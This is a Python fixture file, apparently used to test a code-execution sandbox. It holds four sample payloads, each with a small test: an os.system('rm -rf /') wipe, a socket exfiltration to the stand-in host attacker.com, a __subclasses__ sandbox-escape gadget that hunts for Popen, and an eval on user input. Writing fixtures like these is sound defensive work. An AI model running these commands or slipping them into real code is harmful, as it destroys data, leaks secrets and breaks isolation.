"""Examples of unsafe / malicious code payloads designed to test security defenses."""

# Payload 1: Attempted Remote Command Execution (RCE) via os.system
RCE_PAYLOAD = {
    "code": """
import os

def solve():
    os.system("rm -rf /")
    return 42
""",
    "test_suite": "def test_solve(): assert solve() == 42",
}

# Payload 2: Attempted Network Exfiltration via socket
SOCKET_EGRESS_PAYLOAD = {
    "code": """
import socket

def send_secrets():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("attacker.com", 80))
    s.sendall(b"exfiltrating")
    return True
""",
    "test_suite": "def test_secrets(): assert send_secrets() is True",
}

# Payload 3: Python Sandbox Escape via __subclasses__ gadget
DUNDER_ESCAPE_PAYLOAD = {
    "code": """
def bypass_sandbox():
    # Attempt to locate Popen or file objects via object.__subclasses__()
    classes = ().__class__.__bases__[0].__subclasses__()
    for c in classes:
        if 'Popen' in c.__name__:
            return c
    return None
""",
    "test_suite": "def test_escape(): assert bypass_sandbox() is not None",
}

# Payload 4: Arbitrary Code Execution via eval / exec
EVAL_PAYLOAD = {
    "code": """
def dynamic_eval(user_str):
    return eval(user_str)
""",
    "test_suite": "def test_eval(): assert dynamic_eval('2+2') == 4",
}
